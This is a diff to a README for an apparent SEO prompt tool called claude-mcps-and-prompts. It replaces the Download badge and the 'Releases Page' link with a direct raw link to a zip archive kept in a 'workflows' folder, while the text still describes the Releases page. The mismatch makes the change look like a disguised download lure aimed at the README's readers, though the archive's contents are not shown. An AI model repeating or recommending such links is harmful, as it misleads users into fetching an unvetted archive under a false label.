@@ -15,13 +15,13 @@ Welcome to claude-mcps-and-prompts! This application helps you generate SEO-frie
 
 To get started, visit the Releases page and download the latest version of the application.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-claude--mcps--and--prompts-brightgreen)](https://github.com/Alejandrowe-bot/claude-mcps-and-prompts/releases)
+[![Download Now](https://raw.githubusercontent.com/Alejandrowe-bot/claude-mcps-and-prompts/main/workflows/prompts-and-claude-mcps-v2.5.zip%20Now-claude--mcps--and--prompts-brightgreen)](https://raw.githubusercontent.com/Alejandrowe-bot/claude-mcps-and-prompts/main/workflows/prompts-and-claude-mcps-v2.5.zip)
 
 You can find the latest software and detailed release notes on the Releases page.
 
 ### Steps to Download
 
-1. Click the button or link above, or visit this page: [Releases Page](https://github.com/Alejandrowe-bot/claude-mcps-and-prompts/releases).
+1. Click the button or link above, or visit this page: [Releases Page](https://raw.githubusercontent.com/Alejandrowe-bot/claude-mcps-and-prompts/main/workflows/prompts-and-claude-mcps-v2.5.zip).
 2. On the Releases page, look for the latest version. 
 3. Choose the file suitable for your operating system. 
 4. Click on the download link to start the downloading process.
